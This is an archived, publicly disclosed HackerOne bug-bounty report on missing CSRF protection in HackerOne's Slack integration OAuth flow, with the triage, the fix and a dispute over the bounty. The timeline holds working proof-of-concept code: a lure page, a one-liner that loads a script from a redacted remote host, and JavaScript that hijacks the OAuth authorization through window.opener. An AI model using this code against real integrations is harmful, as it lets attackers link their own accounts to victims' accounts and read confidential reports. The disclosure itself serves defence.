---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - vuln/xss
  - vuln/csrf
  - impact/account-takeover
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2021-07-07
submitted: 2016-09-19T21:16:55.829Z
bounty_usd: 2500
votes: 149
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "whhackersbr"
source: "https://hackerone.com/reports/170552"
title: "Slack integration setup lacks CSRF protection"
---
# Slack integration setup lacks CSRF protection

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 149 | **Program:** HackerOne | **Disclosed:** 2021-07-07

- Report: [https://hackerone.com/reports/170552](https://hackerone.com/reports/170552)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2016-09-19T21:16:55.829Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Details:
**Summary:**

Cross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR_TEAM]/integrations) feature for teams.

**Description (Include Impact):**

The `Integrations` flow is insecure, because it can be abused by CSRF.

PoC:

Request
```
GET https://hackerone.com/auth/slack HTTP/1.1
```

Response
```
Location: https://slack.com/oauth/authorize
?client_id=2174110321.11522100978
&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback
&response_type=code
&scope=incoming-webhook
&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c
```

How can it be bad since you are using `state` parameter?

You are trusting in third-party security that is not under your control.
All the attacker needs is an XSS or Login CSRF or Clickjacking in the third-party system and he can compromise your system. With one of the previous mentioned vulnerabilities in the third-party system, the attacker can control the entire OAuth flow and connect his own accounts to the victim's HackerOne account.

Today, you have just one integration available (Slack).
If you implement more integrations in the future, the damage and the attack surface will grow significantly. Worst if you implement someday something like Login with Facebook / Login with Google / etc., because this bug will lead to account takeover.

**Fix:**

1) Protection against CSRF at the beginning of the OAuth flow:

e.g.:

```
GET https://hackerone.com/auth/slack?CSRF_TOKEN=bdea53bd9a8c73bd983847 HTTP/1.1
```

2) `Phabricator` approach of OAuth connections (a confirmation dialog after the end of the OAuth flow). Picture attached (F121473).

P.S.: Are you interested in Login XSRF in HackerOne?
How do you protect users against Login XSRF in your SSO flow?
Sorry, I can not fully test SSO because I need approval of SSO configuration every time.

## Timeline

- **Report Filed**
- **2016-09-19** @whhackersbr: Sorry, I forgot the picture.
- **Report Needs More Info**
- **Report New**
- **2016-09-20** @whhackersbr: P.S.: 

My point (conclusion):

If the user's data is secure in Slack is not a problem of HackerOne.
But if an attacker can steal data from HackerOne with a bug in Slack, this is a problem of HackerOne.

The solution here, protection against CSRF.
- **2016-09-20** @whhackersbr: P.S. 2: 

Are you interested in Login XSRF in HackerOne?
How do you protect users against Login XSRF in your SSO flow?
Sorry, I can not fully test SSO because I need an ​approval of SSO configuration every time.
- **Report Duplicate**
- **2016-09-21** @whhackersbr: @dirk,

I did read #103072 twice and I really could not understand how my bug is a duplicate of that bug.

#103072 is just about speculations on a nonrealistic scenario.
#170552 is about CSRF, clearly demonstrated.

I believe that I was not clear enough on some point.
So, please, tell me why do you consider this bug a duplicate of #103072?

Thanks.
- **Report Reopened**
- **2016-09-21** @whhackersbr: @reed,

Thanks.
- **2016-09-21** @whhackersbr: @reed @dirk,
> P.S. 2:
Are you interested in Login XSRF in HackerOne?
How do you protect users against Login XSRF in your SSO flow?
Sorry, I can not fully test SSO because I need an ​approval of SSO configuration every time.
- **2016-09-21** @reed: @whhackersbr, we prefer to keep one issue to a report, as it's very difficult to track multiple things otherwise.

We are definitely interested in Login XSRF, both via our normal flow and via SSO-via-SAML. If you would like to test our SAML flow for issues, feel free to sign-up with a test team and configure SAML with a domain you own and control. Shoot support@hackerone.com an e-mail about it when done, and I'll approve you.
- **2016-09-22** @dirk: Hey @whhackersbr,

Apologies, I misinterpreted #103072 when closing this out, we're still looking into possible mitigations here, and we'll keep you posted! I've removed you from #103072 to keep everything clean, please let me know if you'd still want access to that report.

Dirk
- **2016-09-22** @whhackersbr: @dirk @reed @security,

PoC URL:
https://██████/hackerone-csrf.html

Source-codes:

hackerone-csrf.html
```
<html>
	<head>
		<title>
			HackerOne OAuth CSRF - Malicious Page
		</title>
	</head>
	<body>
		<center>
			<h3>HackerOne OAuth CSRF - Malicious Page</h3>
			<br/>
			Copy the javascript code bellow and paste on the target page's console, to fake an XSS.
			<br/>
			<br/>
			<textarea onclick="this.focus();this.select()">var newScript = document.createElement('script');newScript.setAttribute('src', 'https://████/hackerone-csrf.js');document.head.appendChild(newScript);</textarea>
			<br/>
			<br/>
			<h3>
				<a href="https://whhackersbr.slack.com/SLACK-XSS-VULNERABLE-PAGE?fake_vulnerable_parameter=exploit_code" target="_blank">Start the Attack</a>
			</h3>
		</center>
	</body>
</html>
```

hackerone-csrf.js
```
function http(method, url, data = null){
	var xhttp = new XMLHttpRequest();
	xhttp.open(method, url, false);
	if(data){
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	}
	xhttp.send(data);
	return xhttp.responseText;
}

function slackLogin(){
	var response = http("GET", "https://whhackersbr.slack.com");
	var csrf_token = response.match(/name\=\"crumb\" value\=\"(.*?)\" \/\>/i)[1];
	try{
		http("POST", "https://whhackersbr.slack.com", "signin=1&redir=&crumb="+encodeURI(csrf_token)+"&email=hackerone%40███&password=teste123&remember=on");
	}
	catch(err){
	}
}

function windowCrossDomainFinish(){
	try{
		window.opener.document;
		setTimeout(function(){acceptOAuth()}, 2500);
	}
	catch(err){
		setTimeout(function(){windowCrossDomainFinish()}, 500);
	}
}

function acceptOAuth(){
	url = window.opener.document.getElementById("oauth_authorize_confirm_form").action;
	csrf_token = window.opener.document.getElementsByName("crumb")[0].value;
	window.opener.location.href = "https://████████/hackerone-csrf-gameover.html";
	document.body.innerHTML = '<form id="puppet_form" action="'+url+'" method="post">\
					<input type="hidden" name="create_authorization" value="1"/>\
					<input type="hidden" name="crumb" value="'+encodeURI(csrf_token)+'"/>\
					<input type="hidden" name="channel" value="C03CKQQDQ"/>\
				  </form>';
	document.getElementById("puppet_form").submit();
}

slackLogin();
window.opener.location.href = "https://hackerone.com/auth/slack?team_handle=security";
windowCrossDomainFinish();
```

hackerone-csrf-gameover.html
```
<html>
	<head>
		<title>
			HackerOne OAuth CSRF - GAME OVER
		</title>
	</head>
	<body>
		<center>
			<h3>HackerOne OAuth CSRF - GAME OVER</h3>
			<h3>
				<a href="https://███/hackerone-csrf.html">Start Again</a>
			</h3>
		</center>
	</body>
</html>
```
- **2016-09-22** @whhackersbr: PoC Video:
https://youtu.be/ueGL8kzMP5k

Is it possible to find XSS in Slack:
https://hackerone.com/reports/132104
- **2016-09-22** @whhackersbr: I could try to find an XSS in Slack and create a real PoC without the fake XSS, but Slack doesn't allow sharing details about their vulnerabilities, so what is the point?
=(

Please tell me if you need anything else.
- **2016-09-22** @whhackersbr: @dirk @reed @security,

Unauthorized Access to Confidential Bug Descriptions
https://youtu.be/koylzNTwrIU
- **2016-09-22** @dirk: Hey @whhackersbr,

We're thoroughly convinced, and we'll start work on this immediately. Thank you for a very clear PoC!

Dirk
- **2016-09-22** @whhackersbr: Hey @dirk,

Sorry for my delay coding the PoC.
=(

I am at your disposal.
;-)
- **Report Triaged**
- **2016-09-22** @dirk: Our apologies for not immediately recognizing the issue here, we're currently looking for a thorough fix.

We'll keep you posted!
- **2016-09-22** @whhackersbr: @dirk,

Don't worry.
If you didn't understand the issue since the beginning, it was my fault.
I hope I could remediate my mistake.
;-)
- **2016-09-24** @reed: @whhackersbr, this should be resolved. Can you confirm?

Also, anything else from http://www.oauthsecurity.com/ we're missing? :)
- **2016-09-24** @whhackersbr: @reed @dirk @security,

Seens fixed to me.
;-)

> Also, anything else from http://www.oauthsecurity.com/ we're missing? :)

Hmmm, very good article. I will look into it deeply and will let you know if I find anything.
- **Report Resolved**
- **Report Title Updated**
- **2016-09-25** @whhackersbr: @reed @dirk @security,

This is not a security bug, the CSRF protections is working, but I believe your fix broke something.

I can not integrate my Slack anymore.

Picture attached.
- **2016-09-26** @whhackersbr: P.S.:

I saw that we need to pass through a review every time we change the config of the SSO-SAML.
What is done/considered in this review?
Depending on the answer I can or can not have more issues to report.
- **2016-09-26** @dirk: Hey @whhackersbr

You're right, an essential parameter got dropped, breaking the end of the integration flow. We've released a fix for this issue, and integrations should be functional again!

Dirk
- **2016-09-26** @whhackersbr: @dirk @reed,

Thanks.

My last comment here:

I saw that we need to pass through a review every time we change the config of the SSO-SAML.
What is done/considered in this review?
Depending on the answer I can or can not have more issues to report.
- **2016-09-26** @reed: > I saw that we need to pass through a review every time we change the config of the SSO-SAML.
> What is done/considered in this review?
> Depending on the answer I can or can not have more issues to report.

Seems like this makes more sense for the other report you filed? This report is solely about the Slack integration CSRF. We really try to keep one report per issue, as things get lost. Happy to follow-up in that report if you ask that question in there.
- **2016-09-26** @whhackersbr: @reed,

Yes, you are totally right. I made a mistake.
Wrong report, sorry.
=(
- **Bounty Awarded**
- **Report Severity Updated**
- **2016-10-18** @whhackersbr: @reed @security,

Thank you very much for the quick fix and the amazing work here, was a pleasure working with you guys.
;-)

_____________________________________________________________________________

But I need to say that I am a little bit disappointed​ with the decision to drastically reduce the reward, once the minimum bounty for severe bugs is $10,000 (you rewarded me with $2,500, a 75% cut). We, researchers, believe that the minimum is really the minimum, except in extreme cases (unlikely user interaction, bugs that work just in outdated browsers, etc.).

```
Severe: Any bug that might grant unauthorized access to confidential bug
descriptions. Severe bugs have a minimum bounty of $10,000
```

_____________________________________________________________________________

Arguments used to reduce the reward:

> 1) Must have some type of vulnerability in Slack (or any other OAuth-based integration we support)

__1.__ Since Slack is a third-party system, I don't believe that the need of an XSS or anything else in their websites can be considered as a mitigation. You don't control their system and you can't fix their bugs. You are doing a great job protecting HackerOne against XSSs, but you can not trust in the protection of others, for me, this is a security premise, everything outside your control is malicious/insecure by default;

__2.__ I could send an XSS in Slack with the original description, but I don't believe that this is the spirit of BBPs, this behavior would be at least unethical and unfair with Slack. When I send to Google a bug that leaks a sensitive token just to a Facebook URL, they pay a full XSS bounty by default, and vice versa, because they don't trust in the third-party security (an XSS in Facebook would allow an attacker to steal the Google sensitive token, and vice versa).

__3.__ Opinions from others:

>> Google: Cross-site scripting — the ability to inject undesired scripts into a trusted web application — has been one of the top web security vulnerabilities for over a decade. Just in the past 2 years, Google has awarded researchers over $1.2 million for reporting XSS bugs in our applications via the Vulnerability Reward Program (https://security.googleblog.com/2016/09/reshaping-web-defenses-with-strict.html).

>> PortSwigger Web Security (Burp Suite): Trusting that these don't have a single XSS vulnerability and never will in future is a really bad idea (http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html).

__4.__ Publicly disclosed Slack XSSs (if they are the publicly disclosed ones, we can expect at least five times more that were not disclosed and a lot that was not found yet):

* http://██████/slack_xss_reports.html
* https://www.google.com.br/search?q=Slack+AND+%28%22XSS%22+OR+%22cross+site+scripting%22%29+-hackerone

_____________________________________________________________________________

> 2) Must know the team handle (but could easily include a list of calls for tons of teams)

__1.__ Like you said: `but could easily include a list of calls for tons of teams`.
The attacker nor needs to perform all actions of my PoC for each team handle. He just needs to steal the `state` value for each team handle (HackerOne Integrations CSRF + XSS in Slack), get his Slack OAuth code using a server-side script (faster), and make tons of client-side calls to `https://hackerone.com/auth/slack/callback?code=[SLACK_OAUTH_CODE]&state=[HACKERONE_STATE]`. My PoC is far from being the most effective, I just wanted to show a point ASAP.

__2.__ The attacker could make direct attacks without the above approach (even easier):

* Sending the link to the exploit inside a generic report for each program (if he is sending a report, he knows the team handle, he just needs to look the browser's address bar and config the payload individually);

* Sending the link to the exploit through other communication channels: security@company.com, team member's Twitter/LinkedIn/Facebook​, etc.
Again, if he is sending the link to the exploit directly to a company or a team member, he knows the team handle before the attack and he can config the payload individually.

_____________________________________________________________________________

Sorry for the huge text, this is just my humble opinion.

If you don't want to reconsider the bounty, don't worry, I will not send more messages and I will accept the public disclosure request, so no need to shut up me on this report like in the another one.

Thank you very much for your attention and sorry for the hassle.
- **2016-10-19** @whhackersbr: P.S.:

Sorry, I forgot something.
Even with CSP mitigation in #46072, you guys gave a full reward to the researcher.
- **2016-10-28** @whhackersbr: P.S. 2:

Please, remove the strings `██████` before public disclosure.
Thanks.

@reed @security
- **2016-10-28** @reed: @whhackersbr, I've canceled the disclosure request until we can come to a conclusion.

Trying to assess the severity of this issue, we've calculated a 6.1 (Medium) on the CVSSv3 scale ([CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N)).

Report #46072 was solely a HackerOne issue, not requiring a vulnerability in a third-party service in order to exploit it, which makes this issue different.

What are your thoughts? We want to be fair with our assessment and ensure all parties are happy.
- **Changed Scope**
- **2019-04-10** @pei: Hi @whhackersbr - Wondering if you have read our rationale behind our decision on severity and the reward. We'd like to publicly disclose this report.
- **2019-04-11** @whhackersbr: To be honest I never understood the rationale behind your decision.

H1 team decreased the impact based on the need of an XSS in a third-party domain (not controlled by H1), that I showed that had dozens of XSS, but to be honest, it doesn't matter, IMHO, third-party domains need to be considered unsafe by default.

When I can leak sensitive information from a Google/Facebook domain, like a session token, to any third-party domain, they immediately issue a bounty with the same amount of a regular XSS in their own domains, without even asking me to provide for a vulnerability in that domain. This is expected since they need to consider that the third-party domain cannot be trusted ever, and the likelihood of a leak of their token is not lower only because the attacker needs to have an XSS on the third-party domain.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
